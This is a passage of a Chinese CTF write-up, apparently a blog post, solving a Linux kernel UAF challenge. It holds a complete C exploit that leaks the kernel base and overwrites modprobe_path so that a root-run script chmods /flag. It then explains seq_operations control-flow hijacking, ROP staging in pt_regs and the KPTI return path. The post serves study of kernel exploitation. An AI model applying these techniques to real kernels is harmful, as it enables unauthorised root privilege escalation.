<p>如果没有的话我们可以先通过/proc/kallsyms找到__request_module的地址，然后查看汇编，就能找到对其的引用。</p>
<p><img src="https://s2.loli.net/2023/01/21/zBdF7PTJsheVKG2.png" alt=""></p>
<p>其中这个<__request_module+70>比较的地方就是modprode_path的地址</p>
<p><img src="https://s2.loli.net/2023/01/21/D3kCiuTZpFrBMGQ.png" alt=""></p>
<p>所以我们通过任意地址写就能更改这个路径，进而执行具有root权限的程序，更改flag文件的读写权限。</p>
<p>具体的写上链上的下个object的地址的位置(偏移offset)可以gdb看一下(不像用户态下的堆块，next_chunk地址偏移固定)</p>
<p>不过说实话由于不能像用户态下方便的通过pwndbg插件的命令<code>heap</code>看单链表到底长啥样，所以具体申请几次才能得到我们想要的地方还得多调试几次。在buf那打个内存断点，然后看看申请的堆块地址。</p>
<p><img src="https://s2.loli.net/2023/01/28/a25Y4nhZPzuwSWK.png" alt=""></p>
<p>exp如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_SIZE 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BASE 0xffffffff81000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff82850580</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RSP_RET 0xffffffff8100d3d3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RSP_VAL_RET 0xffffffff8111347b</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff8106ab4d</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff81095c30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE    0xffffffff81e00ef4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RET 0xffffffff81e01058</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_CLOSE 0xffffffff8124b180</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRETQ 0xffffffff8102b4df</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"><span class="keyword">int</span> dev_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Error</span><span class="params">(<span class="keyword">char</span>* error)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m [?] %s\033[0m\n&quot;</span>,error);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Doing</span><span class="params">(<span class="keyword">char</span> * Doing)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m [*] %s \033[0m\n&quot;</span>,Doing);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Done</span><span class="params">(<span class="keyword">char</span> *Done)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m [+] %s \033[0m\n&quot;</span>,Done);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">writeMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    m_type;</span><br><span class="line">    <span class="keyword">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span>-<span class="keyword">sizeof</span>(struct msg_msg)+SHM_SIZE-<span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125;uafmsg;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int32_t</span> index;</span><br><span class="line">    <span class="keyword">int32_t</span> len;</span><br><span class="line">    <span class="keyword">void</span>* ptr;</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125;request;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int32_t</span> index,<span class="keyword">int32_t</span> len,<span class="keyword">void</span> * ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    req.len = len;</span><br><span class="line">    req.ptr = ptr;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xDEADBEEF</span>, &amp;req);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int32_t</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xC0DECAFE</span>, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">open_shm_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> shmid;</span><br><span class="line">	<span class="keyword">if</span> ((shmid=shmget(IPC_PRIVATE,<span class="number">100</span>,<span class="number">0600</span>))==<span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[?] Shmget Error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">char</span> *shmaddr=shmat(shmid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (shmaddr==(<span class="keyword">void</span>*)<span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[?] Shmat Error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> shmaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">leak_addr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Doing(<span class="string">&quot;Start Leaking addr&quot;</span>);</span><br><span class="line">    <span class="keyword">void</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">void</span>* recv = <span class="built_in">malloc</span>(<span class="number">0x1018</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span>(qid&lt;<span class="number">0</span>)</span><br><span class="line">        Error(<span class="string">&quot;Make Queue Error&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;uafmsg,<span class="number">0</span>,<span class="keyword">sizeof</span>(uafmsg));</span><br><span class="line">    writeMsg(qid,&amp;uafmsg,<span class="keyword">sizeof</span>(uafmsg),<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span>* shm_addr=open_shm_file();</span><br><span class="line">    <span class="keyword">if</span>(shmdt(shm_addr) &lt; <span class="number">0</span>) <span class="comment">//****注意要释放，否则会kernel panic</span></span><br><span class="line">        Error(<span class="string">&quot;shmdt!&quot;</span>);</span><br><span class="line">    readMsg(qid,recv,<span class="keyword">sizeof</span>(uafmsg),<span class="number">1</span>);</span><br><span class="line">    kernel_base = ((<span class="keyword">uint64_t</span>*)recv)[<span class="number">0x1fb</span>]- <span class="number">0x19ac6c0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m [+] kernel_base_addr is %lx \033[0m\n&quot;</span>,kernel_base);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">    <span class="built_in">free</span>(recv);</span><br><span class="line">    Done(<span class="string">&quot;leaking Dne&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> kernel_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdi_ret;</span><br><span class="line"><span class="keyword">uint64_t</span> init_cred;</span><br><span class="line"><span class="keyword">uint64_t</span> commit_creds;</span><br><span class="line"><span class="keyword">uint64_t</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/bad_file&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nchmod 777 /flag&#x27; &gt; /tmp/change_flag&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/bad_file&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/change_flag&quot;</span>);</span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/rwctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(dev_fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Error(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> data[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> offset  = leak_addr()-BASE;</span><br><span class="line">    <span class="keyword">uint64_t</span> Path_To_write =offset+ BASE+<span class="number">0x18510a0</span>;</span><br><span class="line"></span><br><span class="line">    Doing(<span class="string">&quot;Start to alloc Modepath&quot;</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> * buf = (<span class="keyword">uint64_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    buf[<span class="number">2</span>] = Path_To_write;<span class="comment">//具体offset偏移可以通过调试</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span>*)buf,<span class="string">&quot;/tmp/change_flag&quot;</span>);</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);<span class="comment">//此时申请到的就是modprobe_path</span></span><br><span class="line">    system(<span class="string">&quot;/tmp/bad_file&quot;</span>);</span><br><span class="line">    <span class="comment">// system(&quot;/bin/sh&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效果如下图所示</p>
<p><img src="https://s2.loli.net/2023/01/28/zBYTywCIuJ3ktfR.png" alt=""></p>
<h2 id="Analysis-解法二-劫持控制流提权"><a href="#Analysis-解法二-劫持控制流提权" class="headerlink" title="Analysis.解法二:劫持控制流提权"></a>Analysis.解法二:劫持控制流提权</h2><p>既然有了任意次的UAF，那么我们可以考虑堆喷某些结构体然后进行劫持控制流，比如tty_struct是一个常见的用来劫持控制流的东西。</p>
<p>比较朴素的思路大致如下，先通过驱动申请一个合适大小的object然后释放放入freelist，然后堆喷msg_msg命中释放的object，再次free那个object造成UAF，然后再申请tty_struct这样msg_msg就能控制tty_struct。但是有个问题msg_msg的消息内容无法随意更改，这样就造成了我们无法劫持函数指针。这样我们就陷入了僵局。那么我们就必须寻求其他方式进行写，可行的办法有很多，比如利用setxattr,利用sk_buff。当然，题目在申请object的时候提供了写操作，所以我们可以直接利用它来写。但是我们并不能为了做题而做题，如果没给写的操作我们也应利用其他方法完成。这里为了学习，我把几种方法都尝试并且记录了一下</p>
<h3 id="PLAN1-题目提供的写操作"><a href="#PLAN1-题目提供的写操作" class="headerlink" title="PLAN1.题目提供的写操作"></a>PLAN1.题目提供的写操作</h3><h4 id="seq-operations结构体劫持控制流"><a href="#seq-operations结构体劫持控制流" class="headerlink" title="seq_operations结构体劫持控制流"></a>seq_operations结构体劫持控制流</h4><p>我选用的是<code>seq_operations</code>这个结构体来劫持控制流(我不知道<code>shm_file_data</code>是否能劫持控制流，回头可以尝试一下)，它的大小是0x20，由<code>kmalloc-32</code>申请，定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>当我们打开<code>/proc/self/stat</code>文件时，就会在内核空间分配一个<code>seq_operations</code>结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seq_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br></pre></td></tr></table></figure>
<p>当读一个stat文件时，内核会调用<code>proc_read_iter</code>指针，其默认值为<code>seq_read_iter()</code> ,有如下逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">seq_read_iter</span><span class="params">(struct kiocb *iocb, struct iov_iter *iter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> = <span class="title">iocb</span>-&gt;<span class="title">ki_filp</span>-&gt;<span class="title">private_data</span>;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure>
<p>也就是说会调用<code>seq_operations</code>的start指针。所以我们只要<strong>改写seq_operations-&gt;start然后读取对应文件</strong>即可劫持控制流</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">seq_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="comment">//... change the seq_operations-&gt;start</span></span><br><span class="line">read(seq_fd,buf,size);<span class="comment">//(或者直接用内联汇编的方式syscall来read。并且这样还能控制其他寄存器，方便我们在pt_regs上面布置ROP链)</span></span><br></pre></td></tr></table></figure>
<h4 id="利用pt-regs结构布置ROP"><a href="#利用pt-regs结构布置ROP" class="headerlink" title="利用pt_regs结构布置ROP"></a>利用pt_regs结构布置ROP</h4><p>另外还有一个比较有趣的知识点是关于<code>pt_regs</code>的，这是一个方便于我们进行ROP以及栈迁移的结构。当我们进行系统调用时，从用户态陷入内核态，其中就会通过门结构进入到内核的<code>entry_SYSCALL_64</code>函数，然后通过系统调用表跳转到相应的函数。执行<code>entry_SYSCALL_64</code>函数的时候会通过这条指令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUSH_AND_CLEAR_REGS rax&#x3D;$-ENOSYS</span><br></pre></td></tr></table></figure>
<p>来将用户态下的寄存器压入内核栈上，形成<code>pt_regs</code>结构体，这个结构体在内核栈的栈底，其定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>示意图如下</p>
<p><img src="https://s2.loli.net/2023/01/21/xhIPKTs3HRXDfO6.png" alt=""></p>
<p>其中从r8-r15都是很少用到的，我们可以控制其来布置ROP。比如说我们通过动调发现了劫持控制流执行某个gadget的时候此时rsp距离我们的的pt_regs的距离，我们便可以通过类似<code>add rsp,val ;ret</code>的操作将栈迁移到<code>pt_regs</code>上以便进一步利用。大部分情况下这个长度应该是够的，如果不够我们可以想办法进行类似泄露可控堆地址然后写ROP栈迁移的操作。</p>
<p>关于这个<code>add rsp,val ;ret</code>gadget的寻找如果用ROPgadget的话感觉还是挺难找到的，需要注意的是不一定是ret结尾，如果jmp到ret其实也是一样的，但是这个容易被忽视。可以尝试利用IDApython或者pwntools进行search的方式(就是<code>img.search(asm(&quot;xxx&quot;))).__next__()</code></p>
<p>还有需要提到的是关于<code>swapgs_restore_regs_and_return_to_usermode</code>这个函数，当开启了<code>KPTI</code>的时候，用户态下和内核态下的页表是有差异的，其差异是用<code>cr3</code>寄存器标识的，我们不能通过简单的<code>swapgs;iretq</code>的方式返回用户态，而是需要通过这个函数进行切换。</p>
<p>而我们执行的时候并不能直接从头开始，尤其是利用了<code>pt_regs</code>的情况下，因为这个函数的开始有如下操作</p>
